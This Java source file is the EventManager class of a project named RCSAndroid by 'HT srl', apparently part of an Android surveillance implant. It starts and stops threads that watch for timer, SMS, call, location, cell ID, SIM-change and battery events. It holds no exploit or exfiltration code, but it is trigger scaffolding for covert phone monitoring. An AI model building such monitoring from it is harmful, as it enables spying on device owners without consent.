/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.event;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import android.util.Log;

import com.ht.RCSAndroidGUI.Manager;
import com.ht.RCSAndroidGUI.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventManager.
 */
public class EventManager extends Manager {
	/** The Constant TAG. */
	private static final String TAG = "EventManager";

	/** The singleton. */
	private volatile static EventManager singleton;

	/**
	 * Self.
	 * 
	 * @return the event manager
	 */
	public static EventManager self() {
		if (singleton == null) {
			synchronized (EventManager.class) {
				if (singleton == null) {
					singleton = new EventManager();
				}
			}
		}

		return singleton;
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private EventBase factory(final int key) {
		EventBase e = null;

		if (running.containsKey(key) == true) {
			return (EventBase) running.get(key);
		}

		switch (key) {
		case EventConf.EVENT_TIMER:
			Log.d("QZ", TAG + "Info: " + "");
			e = new TimerEvent();
			break;

		case EventConf.EVENT_SMS:
			Log.d("QZ", TAG + "Info: " + "EVENT_SMS");
			break;

		case EventConf.EVENT_CALL:
			Log.d("QZ", TAG + "Info: " + "EVENT_CALL");
			break;

		case EventConf.EVENT_CONNECTION:
			Log.d("QZ", TAG + "Info: " + "EVENT_CONNECTION");
			break;

		case EventConf.EVENT_PROCESS:
			Log.d("QZ", TAG + "Info: " + "EVENT_PROCESS");
			break;

		case EventConf.EVENT_CELLID:
			Log.d("QZ", TAG + "Info: " + "EVENT_CELLID");
			e = new CellIdEvent();
			break;

		case EventConf.EVENT_QUOTA:
			Log.d("QZ", TAG + "Info: " + "EVENT_QUOTA");
			break;

		case EventConf.EVENT_SIM_CHANGE:
			Log.d("QZ", TAG + "Info: " + "EVENT_SIM_CHANGE");
			break;

		case EventConf.EVENT_LOCATION:
			Log.d("QZ", TAG + "Info: " + "EVENT_LOCATION");
			e = new LocationEvent();
			break;

		case EventConf.EVENT_AC:
			Log.d("QZ", TAG + "Info: " + "EVENT_AC");
			e = new AcEvent();
			break;

		case EventConf.EVENT_BATTERY:
			Log.d("QZ", TAG + "Info: " + "EVENT_BATTERY");
			e = new BatteryEvent();
			break;

		case EventConf.EVENT_STANDBY:
			Log.d("QZ", TAG + "Info: " + "EVENT_STANDBY");
			e = new StandbyEvent();
			break;

		default:
			Log.d("QZ", TAG + "Error: " + "Unknown: " + key);
			break;
		}

		if (e != null) {
			running.put(key, e);
		}

		return e;
	}

	/**
	 * Start events.
	 * 
	 * @return true, if successful
	 */
	public boolean startAll() {
		HashMap<Integer, EventConf> events;

		events = status.getEventsMap();

		if (events == null) {
			Log.d("QZ", TAG + "Events map null");
			return false;
		}

		if (running == null) {
			Log.d("QZ", TAG + "Running Events map null");
			return false;
		}

		final Iterator<Map.Entry<Integer, EventConf>> it = events.entrySet().iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, EventConf> pairs = it.next();
			final int key = pairs.getValue().getType();
			final EventBase e = factory(key);

			if (e != null) {
				e.parse(pairs.getValue());
				
				if (e.getStatus() != EventConf.EVENT_RUNNING) {
					final Thread t = new Thread(e);
					
					t.start();
					threads.put(e, t);
				} else {
					Log.d("QZ", TAG + "Warn: event already running");
				}
			}
		}

		return true;
	}

	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
	/**
	 * Stop events.
	 */
	public void stopAll() {
		final Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet().iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, EventBase> pairs = it.next();
			final EventBase event = pairs.getValue();

			Log.d(TAG, "Stopping: " + event);

			if (event.getStatus() == EventConf.EVENT_RUNNING) {
				event.stopThread();
				
				try {
					final Thread t = (Thread) threads.get(event);
					Check.asserts(t != null, "Null thread");

					t.join();
					threads.remove(event);

				} catch (final InterruptedException e) {
					e.printStackTrace();
					Log.d(TAG,"Error: " + e.toString());
				}
			} else {
				Check.asserts(threads.get(event) == null,
						"Shouldn't find a thread");
			}

		}
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.Manager#start(int)
	 */
	@Override
	public void start(int key) {
		// TODO Auto-generated method stub
		
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.Manager#stop(int)
	 */
	@Override
	public void stop(int key) {
		// TODO Auto-generated method stub
		
	}
}
